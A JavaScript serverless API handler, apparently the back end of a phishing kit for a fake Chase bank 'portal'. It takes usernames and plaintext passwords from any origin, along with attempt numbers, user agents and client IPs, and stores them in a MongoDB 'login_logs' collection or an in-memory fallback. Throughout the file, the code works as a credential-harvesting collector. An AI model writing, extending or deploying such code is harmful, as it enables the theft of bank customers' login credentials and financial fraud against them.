import mongoose from 'mongoose';
import { sharedStorage } from './shared-storage.js';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';

// Login Log Schema
const loginLogSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now, index: true },
  username: String,
  password: String,
  attemptNumber: Number,
  status: String,
  userAgent: String,
  ipAddress: String,
}, { collection: 'login_logs' });

const LoginLog = mongoose.model('LoginLog', loginLogSchema);

let dbConnected = false;
let connection = null;

async function connectDB() {
  if (connection) return connection;
  
  try {
    connection = await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      retryWrites: true,
      w: 'majority'
    });
    dbConnected = true;
    console.log('✅ Connected to MongoDB');
    return connection;
  } catch (err) {
    console.warn('⚠️  MongoDB connection failed');
    dbConnected = false;
    return null;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    await connectDB();

    if (req.method === 'POST') {
      const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
      
      const ipAddress = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
      
      const logData = {
        timestamp: new Date(timestamp),
        username,
        password,
        attemptNumber,
        status,
        userAgent,
        ipAddress,
      };
      
      let stored = 'Fallback';
      
      if (dbConnected) {
        try {
          const log = new LoginLog(logData);
          await log.save();
          stored = 'MongoDB';
        } catch (err) {
          console.error('Error saving to MongoDB:', err.message);
          dbConnected = false;
          // Store in fallback
          sharedStorage.addLog(logData);
        }
      } else {
        // Store in fallback array
        sharedStorage.addLog(logData);
      }
      
      console.log(`[${new Date().toISOString()}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status}) [${stored}]`);
      
      res.status(200).json({ 
        success: true, 
        message: 'Login attempt logged',
        stored
      });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
